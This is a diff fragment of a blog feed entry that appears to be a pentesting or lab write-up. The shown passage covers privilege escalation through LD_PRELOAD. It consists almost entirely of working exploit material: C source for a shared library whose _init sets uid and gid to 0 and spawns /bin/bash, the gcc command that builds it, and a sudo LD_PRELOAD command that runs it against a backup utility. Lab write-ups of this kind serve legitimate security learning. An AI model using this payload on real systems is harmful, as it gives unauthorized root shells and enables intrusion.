+<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
+<p><code>env_keep+=LD_PRELOAD</code>  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>LD_PRELOAD</tag>
+        <tag>MongoDB</tag>
       </tags>
   </entry>
   <entry>
